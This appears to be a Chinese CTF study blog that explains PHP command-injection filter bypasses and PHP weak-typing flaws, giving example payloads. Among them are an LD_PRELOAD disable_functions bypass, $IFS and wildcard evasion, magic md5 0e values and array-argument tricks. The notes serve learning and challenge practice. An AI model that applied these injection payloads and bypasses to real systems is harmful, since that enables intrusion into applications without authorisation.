<h2 id="二-替换绕过函数过滤-即使用特定的函数或者不被过滤的函数执行命令"><a href="#二-替换绕过函数过滤-即使用特定的函数或者不被过滤的函数执行命令" class="headerlink" title="二 替换绕过函数过滤(即使用特定的函数或者不被过滤的函数执行命令)"></a>二 替换绕过函数过滤(即使用特定的函数或者不被过滤的函数执行命令)</h2><p><strong>1.记住常见的可执行函数</strong></p>
<p><img src="/images/YTOjbBuyboX4EFxc64EcBL17n7c.png"></p>
<p><strong>2.LD_PRELOAD(修改库文件)绕过(用于面对禁用函数者过多的情况)</strong></p>
<p>它可以影响程序的运行时的链接,允许你定义在程序运行前优先加载的动态链接库。</p>
<p>因而可以向库文件种中注入恶意程序</p>
<p>putenv(“LD_PRELOAD&#x3D;文件路径”) 这个语句就代表加载动态链接库.</p>
<p>我们需要的就是修改动态链接库中代表某个 php 函数的动作.</p>
<p>再运行这个函数时 便可以运行恶意程序.</p>
<p>下面以经典的修改库文件函数 mail 为例叙述具体流程:</p>
<p>(1)在修改库文件时，先要找出 mail 函数调用了子进程的什么内容(子进程的运行则基于一些以 C 语言为基础的函数).</p>
<p>我们在名为 demo.php 程序中写入 mail 函数并运行</p>
<p>(2)再从 cmd 上输入 strace -o 1.txt -f php demo.php(修改的是 mail 函数普适执行的程序,因此在控制台下进行)</p>
<p>把 demo.php 执行的动作，以文本方式放在 1.txt</p>
<p>(3)再用#cat 1.txt | grep execve 获取 1.txt 的内容,用后面的参数独一地检查调用了哪些子进程</p>
<p>发现在调用的”sendmail”子进程可能代表的是 mail 函数,并且看到了 sendmail 的路径</p>
<p>(4)最后使用 readelf -Ws&#x2F;usr&#x2F;sbin&#x2F;sendmail</p>
<p>查看 sendmail 调用了哪些函数</p>
<p>找到一个明显可以修改定义的函数 getuid()</p>
<p>(5)用#vim demo2.c 手写一个 getuid()的定义,再用#gcc -shared -fPIC demo2.c-O demo2.so</p>
<p>将带有命令的 c 文件编译成为.so 文件，生成动态链接库文件并用上文所提的 putenv 手动添加库文件</p>
<p>(注意:库文件一般以.so 为后缀,但内容为 C 代码)</p>
<p>这样就改变了 mail 函数的进程.</p>
<p>综上 就有一些绕过条件</p>
<p>第一是能够上传自己的.so 文件；</p>
<p>第二是能够控制环境变量的值（设置 LD_PRELOAD 变量），比如 putenv 函数并且未被禁止；</p>
<p>(实际上 可使用蚁剑上的插件直接绕过函数过滤[disable_function]),让过滤的函数有用.上文是为了解释原理.)</p>
<h2 id="三-操作系统连接符"><a href="#三-操作系统连接符" class="headerlink" title="三 操作系统连接符"></a>三 操作系统连接符</h2><p>在 php 命令执行函数中,字符串代表的命令是可用的,字符串中的链接符亦然有用.</p>
<p>所以若出现 system(“ls”.$_GET(a))</p>
<p>可以在 a 前加操作系统链接符以执行 ls 和 a 代表的命令.</p>
<p>&amp;&amp;（逻辑与运算符）: 只有当第一个命令 cmd_1 执行成功（返回值为 0）时，才会执行第二个命令 cmd_2。例:  mkdir test &amp;&amp; cd test</p>
<p>||（逻辑或运算符）: 只有当第一个命令 cmd_1 执行失败（返回值不为 0）时，才会执行第二个命令 cmd_2。例:  cd nonexistent_directory || echo “Directory not found”</p>
<p>&amp;（后台运行符）: 将命令 cmd_1 放到后台执行，Shell 立即执行 cmd_2，两个命令并行执行。例:  sleep 10 &amp; echo “This will run immediately.”</p>
<p>;（命令分隔符,推荐）: 无论前一个命令 cmd_1 是否成功，都会执行下一个命令 cmd_2。例:  echo “Hello” ; echo “World”</p>
<h2 id="四-空格过滤绕过"><a href="#四-空格过滤绕过" class="headerlink" title="四 空格过滤绕过"></a>四 空格过滤绕过</h2><p><strong>1.preg_replace 函数</strong></p>
<p>preg_replace(“M”,”N”,$a)</p>
<p>将 $a 变量中##中间的 M 字符(串)或者字符串替换为 N 字符</p>
<p>并且返回值为替换后的 $a.</p>
<p>注意 如果要替换空格 M 要换成# #</p>
<p><strong>2.用大括号的形式绕过空格</strong></p>
<p>cmd&#x3D;{ls,-l},逗号代表空格,也可以正常执行 ls -l.</p>
<p><strong>3.IFS(内部字段分隔符)代替空格；</strong></p>
<p>$IFS ${IFS}(推荐) $IFS$9 都可以代替空格.</p>
<p><strong>4.UR 编码 09%</strong></p>
<p>09% 代表 tab 键表示的空格,可以绕过正常的空格</p>
<h2 id="五-文件名过滤绕过"><a href="#五-文件名过滤绕过" class="headerlink" title="五 文件名过滤绕过"></a>五 文件名过滤绕过</h2><p><strong>0.如果是换命令 换成其他的能够执行命令的函数</strong></p>
<p><strong>1.通配符?绕过</strong></p>
<p>fl?g 代表?位置的字符不确定 可以绕过 flag 一整个字符串的过滤.</p>
<p><strong>2.通配符*绕过</strong></p>
<p>fl* *ag *可以代表任何字符串</p>
<p>cat *可以查看全部的文件</p>
<p><strong>3.在匹配字符串的时候添加””或者’’</strong></p>
<p>fl’’ag 也可以绕过 flag 一整个字符串的过滤</p>
<p>*<em>4.用转义字符*</em></p>
<p>\在过滤字符的时候会被包含 但是执行指令的时候不会</p>
<p>注意+字符可能会有其他含义 要规避</p>
<p><strong>5.用 $+ 数字&#x2F;@&#x2F;</strong>*</p>
<p>代表的为空 相当于单引号或双引号.</p>
<p><strong>6.内联执行</strong></p>
<p>自定义字符串，再拼接起来.</p>
<p>a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat $a$c$d.txt</p>
<p><strong>7.在环境变量中提取字符</strong></p>
<p>已知环境变量 PATH 为一个路径,且第五个字符为 l</p>
<p>#echo f${PATH:5:1}</p>
<p>可以使用环境变量 PATH 里的第五个字符，（从 0 开始计数，l 为第五个字符）</p>
<p>来显示 1 个字符；</p>
<p>fl</p>
<h2 id="六-常见文件读取指令绕过-通常为过滤-cat"><a href="#六-常见文件读取指令绕过-通常为过滤-cat" class="headerlink" title="六 常见文件读取指令绕过(通常为过滤 cat)"></a>六 常见文件读取指令绕过(通常为过滤 cat)</h2><p>1.tac 反向显示 将倒数第一行显示为第一行 以此类推 但是同一行中的方向不变</p>
<p>2.more 按页显示 敲空格往后翻页</p>
<p>3.less 与 more 同理</p>
<p>4.tail 查看末尾若干行</p>
<p>5.nl 显示的时候顺便显示行号</p>
<p>6.od&#x2F;xxd 以二进制形式读取</p>
<p>7.sort 用于排序文件 效果与 cat 也相似.</p>
<p>8.uniq:报告或删除文件中重复的行 与 cat 效果相似.</p>
<p>9.执行错误的 php 文件(通常只有 flag 这一行的 php 文件是错误的.),并使用 file -f 报错出具体的内容.</p>
<p>例如 passthru(“file -f flag.php”); flag.php 没有办法执行 因此会报错出这个程序的具体内容 其中可能包含 flag</p>
<p>10.grep：在文本中查找指定的字符串所对应的行 并输出这一行</p>
<p>例如 cmd&#x3D;passthru(“grep fla fla*”);</p>
<p>从 fla*文本文件中搜索包含”fla”字符串的行.</p>
<h2 id="七-编码绕过-对提交的命令进行编码"><a href="#七-编码绕过-对提交的命令进行编码" class="headerlink" title="七 编码绕过(对提交的命令进行编码)"></a>七 编码绕过(对提交的命令进行编码)</h2><p>(基础不足 暂时略过)</p>
<h2 id="八-斜杠绕过"><a href="#八-斜杠绕过" class="headerlink" title="*八 斜杠绕过"></a>*八 斜杠绕过</h2><p>这种情况通常为文件路径无法输入 可以用 cd 更换工作目录</p>
<p>再用 cat 直接加文件名进行文件输出</p>
<h2 id="九-多个指令的执行"><a href="#九-多个指令的执行" class="headerlink" title="*九 多个指令的执行"></a>*九 多个指令的执行</h2><p>不仅可以用;还可以用 %0a(推荐,对应换行符) %0d(回车符) %0D%0A 作为多个指令的分隔同时执行多个指令.</p>
<p>注意:回车符（%0d）本身不换行，仅光标回行首；换行符（%0a）仅光标下移一行。</p>
<p>两者组合（%0d%0a，即 \r\n）才是「完整的换行逻辑」，也是最通用的跨场景换行格式.</p>
<h1 id="PHP-函数安全"><a href="#PHP-函数安全" class="headerlink" title="PHP 函数安全"></a>PHP 函数安全</h1><p>在 PHP 中，除了上周学的⼏个命令执⾏函数，还有⼀些危险函数存在⼀些攻击点，也是 ctf ⽐较常⻅的出题点.</p>
<h2 id="1-is-numeric-绕过"><a href="#1-is-numeric-绕过" class="headerlink" title="1.is_numeric 绕过"></a>1.is_numeric 绕过</h2><p>作用：检测变量是否是数字或数字字符串 返回值为 bool。</p>
<p>e.g.</p>
<p>$a &#x3D; $_GET[‘a’];</p>
<p>if (is_numeric($a)) {</p>
<pre><code>exit();
</code></pre>
<p>} elseif ($a &#x3D;&#x3D; 404) {</p>
<pre><code>echo &quot;flag&quot;;
</code></pre>
<p>}</p>
<p>我们要将$a用get方式更改为404 但该函数能够检测变量是数字</p>
<p>通过在数字前面或者后面加上%0a %0b %0c %0d %09等文件名过滤绕过的方法绕过</p>
<h2 id="2-PHP精度"><a href="#2-PHP精度" class="headerlink" title="2.PHP精度"></a>2.PHP精度</h2><p>可使用IEEE 754 标准在线转换网站：<a target="_blank" rel="noopener" href="https://tooltt.com/floatconverter/">https://tooltt.com/floatconverter/</a></p>
<p>进行进制转换.</p>
<p>(注:基本上所有语言双精度格式都采用 IEEE 754)</p>
<p>用精度漏洞可用x.99999999999999999来绕过对x+1数字的限制.</p>
<h2 id="3-比较和类型转换漏洞"><a href="#3-比较和类型转换漏洞" class="headerlink" title="3.比较和类型转换漏洞"></a>3.比较和类型转换漏洞</h2><p>PHP 包含 松散 和 严格 比较</p>
<p>松散比较（&#x3D;&#x3D;）比较值，但不比较类型，严格比较（&#x3D;&#x3D;&#x3D;）即比较值也比较类型</p>
<p>echo (123 &#x3D;&#x3D; “123”)?1:0;</p>
<p>返回:1</p>
<p>echo (123 &#x3D;&#x3D;&#x3D; “123”)?1:0;</p>
<p>返回:0</p>
<p>注： 字符串转成数字后会是 0,而不是对应的ASCII码值.</p>
<p>var_dump(0 &#x3D;&#x3D; “a”);</p>
<p>返回： 1（0 &amp; 0 自然为1）</p>
<p>$id &#x3D; intval(“12312a”);</p>
<p>var_dump($id);</p>
<p>输出：12312</p>
<p>在 PHP 中类型转换有一定的缺陷，如果一个 字符串 要转成数值类型，首先对字符串进行一个判断，</p>
<p>如果字符串包含 e 、. 、E 则会作为 float 来取值，否则则为 int ，上述例子由于 a 没有包含任何东西，</p>
<p>所以被当作 int 来处理了，</p>
<p>这里要说明的是，如果字符串起始部分为 数值 ，则采用 起始的数值 ，否则一律为 0</p>
<p>需要注意的是科学计数法和十六进制也会被识别出来</p>
<p>var_dump(100 &#x3D;&#x3D; “1e2”); #采用科学计数法</p>
<p>返回：true</p>
<p>var_dump(23333 &#x3D;&#x3D; “0x5b25”); #采用十六进制</p>
<p>返回：true</p>
<p>在 PHP8.0.0 之前（最新版本已修复），如果 字符串 与 数字 或者 数字字符串 进行比较，</p>
<p>则会先进行 类型转换 再进行比较。</p>
<p>最新版本直接识别为string string&#x3D;&#x3D;0会返回false了.</p>
<h2 id="4-PHP-弱类型比较"><a href="#4-PHP-弱类型比较" class="headerlink" title="4.PHP 弱类型比较"></a>4.PHP 弱类型比较</h2><p>判断原始变量类型的函数(注意 PHP的变量不存在先声明后定义 一定要定义)</p>
<h4 id="1-gettype-var-返回变量的「原始类型字符串」"><a href="#1-gettype-var-返回变量的「原始类型字符串」" class="headerlink" title="(1)gettype($var)返回变量的「原始类型字符串」"></a><strong>(1)gettype($var)返回变量的「原始类型字符串」</strong></h4><p>直接告诉你变量是什么类型（如 int、string、null 等）。</p>
<p>(必须传已定义的变量)</p>
<h4 id="2-empty-var-——-“空值检测器”"><a href="#2-empty-var-——-“空值检测器”" class="headerlink" title="(2)empty($var) —— “空值检测器”"></a><strong>(2)empty($var) —— “空值检测器”</strong></h4><p>判断变量是否为「空值」（宽松判断，不区分类型，只要是 “无意义” 的值都算空）。</p>
<p>以下值会被判定为「空」，返回 true，其余返回 false：</p>
<p>未定义的变量（$var 没声明）；</p>
<p>null（显式赋值为 null）；</p>
<p>布尔值 false；</p>
<p>数值 0、0.0（整数 0、浮点数 0）；</p>
<p>空字符串 “”、字符串 “0”（注意：仅 “0” 算空， “00”、”false” 不算）；</p>
<p>空数组 []（count($var) &#x3D;&#x3D; 0）；</p>
<p>(可以传未定义的变量)</p>
<h4 id="3-is-null-var-——-“严格-null-判断器”"><a href="#3-is-null-var-——-“严格-null-判断器”" class="headerlink" title="(3)is_null($var) —— “严格 null 判断器”"></a><strong>(3)is_null($var) —— “严格 null 判断器”</strong></h4><p>核心作用：仅判断变量是否为「严格的 null」（比 empty 严格 10 倍，只认 null）。</p>
<p>(必须传已定义的变量)</p>
<h4 id="4-isset-var-——-“变量存在检测器”"><a href="#4-isset-var-——-“变量存在检测器”" class="headerlink" title="(4)isset($var) —— “变量存在检测器”"></a><strong>(4)isset($var) —— “变量存在检测器”</strong></h4><p>判断变量「是否已定义」且「值不为 null」（重点：检测 “存在性”，而非 “空值”）。</p>
<p>已定义但值为 null → 返回 false；</p>
<p>已定义且值不为 null → 返回 true（即使值是 0、””、[] 等空值也返回 true）；</p>
<p>支持多变量判断：isset($a, $b, $c) → 所有变量都存在且非 null 才返回 true。</p>
<p>(可以传未定义的变量,返回 false（不报错）；)</p>
<h4 id="5-if-x-——-布尔值隐式转换（“真值检测器”）"><a href="#5-if-x-——-布尔值隐式转换（“真值检测器”）" class="headerlink" title="(5)if($x) —— 布尔值隐式转换（“真值检测器”）"></a><strong>(5)if($x) —— 布尔值隐式转换（“真值检测器”）</strong></h4><p>将变量 $x 隐式转换为布尔值 true&#x2F;false，判断变量是否为「真值」</p>
<p>（逻辑和 empty() 几乎相反，但有细微差异）。</p>
<p>以下值会被转为 false（和 empty() 判定为 “空” 的规则一致）：</p>
<p>null、false、0、0.0、””、”0”、[]；</p>
<p>其余值（如 “ “、1、”abc”、[“a”] 等）都会转为 true。</p>
<p>(必须传已定义的变量)</p>
<h4 id="6-弱类型比较表格"><a href="#6-弱类型比较表格" class="headerlink" title="(6)弱类型比较表格"></a><strong>(6)弱类型比较表格</strong></h4><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/types.comparisons.php#types.comparisions-loose">https://www.php.net/manual/zh/types.comparisons.php#types.comparisions-loose</a></p>
<p>(最重要的:0&#x3D;&#x3D;Null true)</p>
<h4 id="7-strcmp函数"><a href="#7-strcmp函数" class="headerlink" title="(7)strcmp函数"></a><strong>(7)strcmp函数</strong></h4><p>描述：strcmp(str1, str2)</p>
<p>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p>
<p>(注： 在 php5.0 以前，strcmp 返回的是 str2 第一位字母转成 ascii 后减去 str1 第一位字母。)</p>
<p>当 strcmp 比较出错后，会返回 null，null 则为 0，举个例子</p>
<p>$flag &#x3D; ‘flag{123}’;</p>
<p>if (strcmp($flag, $_GET[‘str’]) &#x3D;&#x3D; 0) {</p>
<pre><code>echo $flag;
</code></pre>
<p>}else{</p>
<pre><code>echo &quot;Out!&quot;;
</code></pre>
<p>}</p>
<p>为了使 strcmp 比较出错，可以传入一个数组</p>
<p>非空数组和变量无法正常比较.</p>
<h4 id="8-is-numeric函数"><a href="#8-is-numeric函数" class="headerlink" title="(8)is_numeric函数"></a><strong>(8)is_numeric函数</strong></h4><p>is_numeric() 用于检测数值是否为数值，如果遇到这个函数，可以用上述转换类型的特性</p>
<p>（版本小于 8.0.0），如果传入的是字符串，会先将字符串转换成数值:</p>
<p>(在 PHP8.0.0 之前（最新版本已修复），如果 字符串 与 数字 或者 数字字符串 进行比较，</p>
<p>则会先进行 类型转换 再进行比较。</p>
<p>最新版本直接识别为string string&#x3D;&#x3D;0会返回false了.)</p>
<p>$flag &#x3D; ‘flag{111}’;</p>
<p>$id &#x3D; $_GET[‘id’];</p>
<p>if(is_numeric($id) &gt; 0){</p>
<pre><code>echo &#39;Out!&#39;;
</code></pre>
<p>}else{</p>
<pre><code>if ($id &gt; 233) {
    echo $flag;

}
</code></pre>
<p>}</p>
<p>Payload: ?id&#x3D;2333,</p>
<p>Payload: ?id&#x3D;2333%00</p>
<p>Payload: ?id&#x3D;2333A</p>
<h4 id="9-is-switch函数"><a href="#9-is-switch函数" class="headerlink" title="(9)is_switch函数"></a><strong>(9)is_switch函数</strong></h4><p>is_switch()¶</p>
<p>这个方法和类型转换一样大同小异，case 会自动将字符转换成数值。这里来个例子就知道了</p>
<p>$a &#x3D; “233a”; # 注意这里</p>
<p>$flag &#x3D; “flag{Give you FLAG}”;</p>
<p>switch ($a) {<br>    case 1:<br>        echo “No Flag”;<br>        break;<br>    case 2:<br>        echo “No Flag”;<br>        break;<br>    case 233:<br>        echo $flag;</p>
<pre><code>    break;

default:

    $a = 233;

    echo &quot;Haha...&quot;;
</code></pre>
<p>}</p>
<p>输出：flag{Give you FLAG}</p>
<h4 id="10-sha1-函数"><a href="#10-sha1-函数" class="headerlink" title="(10)sha1()函数"></a><strong>(10)sha1()函数</strong></h4><p>sha1() 是 PHP 中用于计算字符串 SHA-1 哈希值 的内置函数，属于哈希算法的一种，</p>
<p>核心用途是将任意长度的字符串转换为固定长度（40 个字符）的 16 进制字符串</p>
<p>sha1 的参数不能为数组，传入数组会返回 NULL，所以先传一个数组使得 sha1 函数报错，</p>
<p>接着再左右两边传入不一样的内容，两边条件自然 &#x3D;1，相等即可绕过.</p>
<p>$flag &#x3D; “flag{Chain!}”;</p>
<p>$get &#x3D; $_GET[‘get’];</p>
<p>$teg &#x3D; $_GET[‘teg’];</p>
<p>if ($get !&#x3D; $teg &amp;&amp; sha1($get) &#x3D;&#x3D;&#x3D; sha1($teg)) {</p>
<p>#if ($get !&#x3D; $teg &amp;&amp; sha1($get) &#x3D;&#x3D; sha1($teg)) {</p>
<pre><code>echo $flag;
</code></pre>
<p>}else{</p>
<pre><code>echo &#39;Out!&#39;;
</code></pre>
<p>}</p>
<p>Payload: ?get[]&#x3D;&amp;teg[]&#x3D;1</p>
<h3 id="5-md5哈希值问题"><a href="#5-md5哈希值问题" class="headerlink" title="5.md5哈希值问题"></a><strong>5.md5哈希值问题</strong></h3><p>描述：md5(字符串,字符串,var2)</p>
<p>计算 字符串 的 MD5 散列值，如果 var2 为真将返回 16 字符长度的原始二进制格式</p>
<p>md5 在处理哈希字符串的时候，如果 md5 编码后的哈希值时 0e （科学计数法）开头的，都一律解释为 0，</p>
<p>所以当两个不同的值经过哈希编码后他们的值都是以 0e 开头的，则每个值都是 0</p>
<p>(他们用松散等于是相等的 但严格等于未必!)</p>
<p>var_dump(0e912 &#x3D;&#x3D; 0e112?1:0);</p>
<p>输出：1</p>
<p>常见 md5 以 0e 开头的值</p>
<p>数值型</p>
<p>240610708 0e462097431906509019562988736854 返回：0</p>
<p>314282422 0e990995504821699494520356953734 返回：0</p>
<p>571579406 0e972379832854295224118025748221 返回：0</p>
<p>903251147 0e174510503823932942361353209384 返回：0</p>
<p>字母型</p>
<p>QLTHNDT 0e405967825401955372549139051580 返回：0</p>
<p>QNKCDZO 0e830400451993494058024219903391 返回：0</p>
<p>EEIZDOI 0e782601363539291779881938479162 返回：0</p>
<p>TUFEPMC 0e839407194569345277863905212547 返回：0</p>
<h4 id="弱类型比较的处理方法"><a href="#弱类型比较的处理方法" class="headerlink" title="&#x3D;&#x3D;弱类型比较的处理方法"></a><strong>&#x3D;&#x3D;弱类型比较的处理方法</strong></h4><p>$flag &#x3D; “flag{THIS_IS_REAL_FLAG}”;</p>
<p>$v1 &#x3D; $_GET[‘gat’];</p>
<p>$v2 &#x3D; $_GET[‘tag’];</p>
<p>if ($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2)) {</p>
<pre><code>echo $flag;
</code></pre>
<p>}else{</p>
<pre><code>echo &quot;Out!&quot;;
</code></pre>
<p>}</p>
<p>v1 和 v2 是两个参数变量，首先 v1 不等于 v2，意思就是两个值必须不相同，</p>
<p>其次 md5 后的 v1 和 md5 后的 v2 必须相同，这时候就可以使用上述 0e 方法构造 Payload，</p>
<p>只需找出哪个值经过 md5 编码后以 0e 开头即可</p>
<p>Payload: ?gat&#x3D;240610708&amp;tag&#x3D;314282422</p>
<h4 id="数组比较法绕过-强比较"><a href="#数组比较法绕过-强比较" class="headerlink" title="数组比较法绕过&#x3D;&#x3D;&#x3D;强比较"></a><strong>数组比较法绕过&#x3D;&#x3D;&#x3D;强比较</strong></h4><p>如果遇到下列程序</p>
<p>$flag &#x3D; “flag{THIS_IS_REAL_FLAG}”;</p>
<p>$str1 &#x3D; $_GET[‘gat’];</p>
<p>$str2 &#x3D; $_GET[‘tag’];</p>
<p>if (md5($str1) &#x3D;&#x3D;&#x3D; md5($str2)) {</p>
<pre><code>echo $flag;
</code></pre>
<p>}</p>
<p>用上述 0e 方法自然是不可行的（注意：&#x3D;&#x3D;&#x3D;），这时候就得使用数组来绕过了</p>
<p>如果传入一个数组的值，会报出错误（md5 只能使用字符串），报错后就相当于绕过&#x3D;&#x3D;&#x3D;这个条件了</p>
<p>(注： 在 PHP 8.0.0 时，该方法行不通了)</p>
<h4 id="md5-碰撞问题"><a href="#md5-碰撞问题" class="headerlink" title="md5 碰撞问题"></a><strong>md5 碰撞问题</strong></h4><p><strong>(即md5相同而内容完全不一样的字符串)</strong></p>
<p>如果遇到不能传入数组，只能传入字符串的时候，如下例</p>
<p>$flag &#x3D; “flag{THIS_IS_REAL_FLAG}”;</p>
<p>$str1 &#x3D; $_GET[“gat”];</p>
<p>$str2 &#x3D; $_GET[“tag”];</p>
<p>if((string)$str1 !&#x3D;&#x3D; (string)$str2 &amp;&amp; md5($str1)&#x3D;&#x3D;&#x3D;md5($str2)){</p>
<pre><code>echo &quot;flag{THIS_IS_REAL_FLAG}&quot;;
</code></pre>
<p>}else{</p>
<pre><code>echo &quot;Out!&quot;;
</code></pre>
<p>}</p>
<p>这时候就得需要 md5 碰撞((string)转化让第二个条件&#x3D;&#x3D;&#x3D;无法返回null,不然也可以用第二点的数组绕过)，</p>
<p>上面判断条件的意思是，str1 和 str2 内容必须不同，但是 md5 必须相同。</p>
<p>这里可以使用工具构造</p>
<p>240610708</p>
<p>314282422</p>
<p>存在MD5碰撞漏洞</p>
<h3 id="6-变量覆盖漏洞"><a href="#6-变量覆盖漏洞" class="headerlink" title="6.变量覆盖漏洞"></a><strong>6.变量覆盖漏洞</strong></h3><p>变量如果未被初始化，且能够被用户所控制，那么很可能会导致安全问题，前提是环境开启了</p>
<p>register_globals&#x3D;ON</p>
<p>如果传入一个参数 ?id&#x3D;1，并且这个参数把原有的变量值给覆盖掉了则叫做 变量覆盖漏洞</p>
<p>例如</p>
<p>$flag &#x3D; “flag{Chain!}”;</p>
<p>$a &#x3D; “A”;</p>
<p>$b &#x3D; “B”;</p>
<p>echo “$a” . “\n”;</p>
<p>echo “$b” . “\n”;</p>
<p>$a &#x3D; $_GET[‘get’];  # $a 变量被我们传入的get给覆盖掉了</p>
<p>echo $a . “\n”;</p>
<p>echo $b . “\n”;</p>
<p>传入参数：?get&#x3D;Genshin，返回</p>
<p>a:A</p>
<p>b:B</p>
<p>a:Genshin</p>
<p>b:B</p>
<p>漏洞产生原因大致有:</p>
<p>register_globals（全局变量）为 On</p>
<p>$$ 使用不恰当<br>extract() 函数使用不当<br>parse_str() 使用不当<br>import_request_variables() 使用不当</p>
<p>(12.1)$$</p>
<p>在 PHP 中，$$ 是可变变量（Variable Variables） 的语法，核心作用是：用一个变量的值作为另一个变量的名称。</p>
<p>简单说：如果有一个变量 $a &#x3D; “name”，那么 $$a 就等价于 $name（把 $a 的值 “name” 当作了新变量的名称）。</p>
<h4 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a><strong>extract()函数</strong></h4><p>描述：extract(array,flags,prefix)</p>
<p>array：数组</p>
<p>flags(相当于模式的选择)：</p>
<pre><code>EXTR_OVERWRITE - 如果有冲突，覆盖已有的变量。（默认）

EXTR_SKIP - 如果有冲突，不覆盖已有的变量。

EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。（需要第 prefix 参数）

…
</code></pre>
<p>prefix：该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</p>
<p>即若数组中有”a”&#x3D;&gt;”STR”</p>
<p>变量又存在”a”&#x3D;”STR2”</p>
<p>则EXTR_PREFIX_SAME模式下不会把STR赋给a,而会创建一个&lt;前缀&gt;_a的变量并把值赋给他    </p>
<p>extract 用来将变量从数组中导入到当前的符号表中，并返回成功导入到符号表中的变量数目</p>
<p>例</p>
<p>$a &#x3D; “Source”;</p>
<p>$array &#x3D; array(</p>
<pre><code>&quot;a&quot;=&gt;&quot;JP&quot;,

&quot;b&quot;=&gt;&quot;RU&quot;,

&quot;c&quot;=&gt;&quot;US&quot;,
</code></pre>
<p>);</p>
<p>extract($array);</p>
<p>echo “$a &#x3D; “ . $a . “<br>“; # 注意这里，a原本是有内容的</p>
<p>echo “$b &#x3D; “ . $b . “<br>“;</p>
<p>echo “$c &#x3D; “ . $c . “<br>“;</p>
<p>返回</p>
<p>$a &#x3D; JP</p>
<p>$b &#x3D; RU</p>
<p>$c &#x3D; US</p>
<p>(注意:extract($_POST); 的核心意思是：将前端通过 POST 请求提交的所有数据（存储在 $_POST 关联数组中）</p>
<p>批量转为当前作用域的 PHP 变量—— 数组的「键名」会变成变量名，数组的「键值」会变成变量值。)</p>
<p>(假设前端通过表单 &#x2F; POST 请求发送了 3 个变量：username&#x3D;张三、age&#x3D;25、email&#x3D;<a href="mailto:&#122;&#104;&#97;&#110;&#x67;&#115;&#97;&#110;&#x40;&#101;&#120;&#x61;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#x6f;&#109;">zhangsan@example.com</a>，那么 PHP 接收后：</p>
<p>$_POST 数组的结构是：[“username” &#x3D;&gt; “张三”, “age” &#x3D;&gt; 25, “email” &#x3D;&gt; “<a href="mailto:&#x7a;&#x68;&#97;&#110;&#103;&#x73;&#97;&#110;&#64;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#99;&#111;&#x6d;">zhangsan@example.com</a>“]</p>
<p>执行 extract($_POST); 后，会自动创建 3 个变量：</p>
<p>$username &#x3D; “张三”（键名 username → 变量名 $username，键值为值）</p>
<p>$age &#x3D; 25（键名 age → 变量名 $age）</p>
<p>$email &#x3D; “<a href="mailto:&#x7a;&#104;&#x61;&#x6e;&#103;&#x73;&#97;&#x6e;&#x40;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#x65;&#x2e;&#99;&#x6f;&#x6d;">zhangsan@example.com</a>“（键名 email → 变量名 $email）</p>
<p>之后你可以直接用 $username、$age 访问数据，无需再写 $_POST[‘username’]。)</p>
<h4 id="parse-str-str-函数"><a href="#parse-str-str-函数" class="headerlink" title="parse_str(str)函数"></a><strong>parse_str(str)函数</strong></h4><p>描述：parse_str(str) 用于将字符串解析成多个变量(也可以为单个变量)，没有返回值\</p>
<p>parse_str(“username&#x3D;A&amp;password&#x3D;123456”);</p>
<p>echo “Username: “ . $username . “<br>“;</p>
<p>echo “Password: “ . $password;</p>
<p>输出</p>
<p>Username: A</p>
<p>Password: 123456</p>
<p>原本这个函数有 array 参数的，但在 7.2 后废除了，array 变量会以数组元素的形式存入到这个数组，作为替代</p>
<p>来到例题</p>
<p>$UIUCTF &#x3D; “UIUCTF Hacker.”;</p>
<p>$id &#x3D; $_GET[‘id’];</p>
<p>@parse_str($id);</p>
<p>if ($a[0] !&#x3D; ‘QNKCDZO’ &amp;&amp; md5($a[0]) &#x3D;&#x3D; md5(‘QNKCDZO’)) {</p>
<pre><code>echo $flag;
</code></pre>
<p>}else{</p>
<pre><code>echo &quot;Out!&quot;;
</code></pre>
<p>}</p>
<p>#QNKCDZO &#x3D; 0e830400451993494058024219903391</p>
<p>注意第四行，和前面的 md5 比较有关系，但不同的是这里加入了 parse_str 这个函数，这段代码大致意思就和上面 md5 绕过的意思一样，如果 md5 编码后的哈希值时 0e （科学计数法）开头的，都一律解释为 0，所以当两个不同的值经过哈希编码后他们的值都是以 0e 开头的，则每个值都是 0，与众不同的是我们要覆盖掉 a[0] 这个变量</p>
<p>Payload: ?id&#x3D;a[0]&#x3D;240610708</p>
<h4 id="register-globals环境变量问题"><a href="#register-globals环境变量问题" class="headerlink" title="register_globals环境变量问题"></a><strong>register_globals环境变量问题</strong></h4><p>register_globals 设置为 on 的时候，传递的参数会 自动注册 为全局变量。</p>
<p>ini_set(“register_globals”, “On”);</p>
<p>echo $a;</p>
<h3 id="略-伪协议问题"><a href="#略-伪协议问题" class="headerlink" title="(略)伪协议问题"></a><strong>(略)伪协议问题</strong></h3><p>(基础不足，暂时略过)</p>
<h1 id="正则表达式基本语法"><a href="#正则表达式基本语法" class="headerlink" title="正则表达式基本语法"></a>正则表达式基本语法</h1><p>正则表达式是⼀种⽤于匹配和操作⽂本的强⼤⼯具，它是由⼀系列字符和特殊字符组成的模式，⽤于 </p>
<p>描述要匹配的⽂本模式。 </p>
<p>正则表达式可以在⽂本中查找、替换、提取和验证特定的模式。 </p>
<p>例如： </p>
<p>• runoo+b，可以匹配 runoob、runooob、runoooooob 等，+ 号代表前⾯的字符必须⾄少出现⼀ </p>
<p>次（</p>
<p>1次或多次） </p>
<p>• runoo<em>b，可以匹配 runob、runoob、runoooooob 等，</em> 号代表前⾯的字符可以不出现，也可 </p>
<p>以出现⼀次或者多次（</p>
<p>0次、或1次、或多次） </p>
<p>• colou?r 可以匹配 color 或者 colour，? 问号代表前⾯的字符最多只可以出现⼀次（</p>
<p>0次或1次） </p>
<p>正则分隔符:（</p>
<p>PHP 正则需⽤ &#x2F; 或 # 等包裹）例如&#x2F;runoo*b&#x2F; </p>
<p>⼦表达式:不加括号的时候是前⼀个字符,加括号时是前⼀个括号内的字符 </p>
<p>例如colo(ur)?可以匹配colo. </p>
